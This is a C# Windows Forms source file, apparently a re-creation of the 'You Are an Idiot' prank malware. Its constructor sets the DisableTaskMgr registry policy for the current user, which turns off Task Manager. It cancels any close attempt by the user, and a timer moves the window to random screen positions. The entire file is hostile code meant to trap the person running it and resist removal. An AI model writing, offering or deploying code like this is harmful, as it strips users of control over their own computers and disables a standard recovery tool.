using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;

namespace YouAreAnIdiot
{
    public partial class Form1 : Form
    {
        
        public Form1()
        {
            InitializeComponent();
            


            //Task Manager Disable
             RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
             if (objRegistryKey.GetValue("DisableTaskMgr") == null)
             objRegistryKey.SetValue("DisableTaskMgr", "1");





        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            switch (e.CloseReason)
            {
                case CloseReason.UserClosing:
                    e.Cancel = true;
                    break;
            }

            base.OnFormClosing(e);
        }


        private void pictureBox1_Click(object sender, EventArgs e)
        {
            
        }
        int x, y;
        Random rdm;
        private void timer1_Tick(object sender, EventArgs e)
        {

            XRandomLocation();
            Thread.Sleep(200);
            YRandomLocation();
            this.Left = x;
            this.Top = y;






           
          
        
            
            
            
        
        }
        private Size ScreenSize()
        {
            Size screen_Size = new Size();
            try
            {
                Rectangle rect = new Rectangle(int.MaxValue, int.MaxValue, int.MinValue, int.MinValue);
                foreach (Screen screen in Screen.AllScreens)
                {
                    rect = Rectangle.Union(rect, screen.Bounds);
                }
                screen_Size.Width = rect.Width;
                screen_Size.Height = rect.Height;



                return screen_Size;
            }
            catch (Exception)
            {
                screen_Size.Width = 1440;
                screen_Size.Height = 900;

                return screen_Size;
            }
        }
        private void XRandomLocation()
        {
            rdm = new Random();
            x = rdm.Next(0, ScreenSize().Width);
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            
        }

        private void YRandomLocation()
        {
            rdm = new Random();
            y = rdm.Next(0, ScreenSize().Height);
        }
        
        
    }


}
